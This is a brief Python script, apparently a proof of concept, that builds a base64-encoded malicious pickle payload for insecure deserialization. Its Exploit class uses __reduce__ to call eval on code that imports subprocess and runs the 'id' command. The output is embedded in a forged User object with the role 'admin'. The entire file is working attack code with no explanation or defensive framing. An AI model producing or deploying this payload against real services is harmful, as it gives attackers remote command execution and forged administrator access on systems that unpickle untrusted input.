import pickle, base64

class Exploit(object):
    def __reduce__(self):
        cmd = "__import__('subprocess').check_output(['id']).decode()"
        return (eval, (f"type('User', (), {{'username': {cmd}, 'role': 'admin'}})()",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(payload)
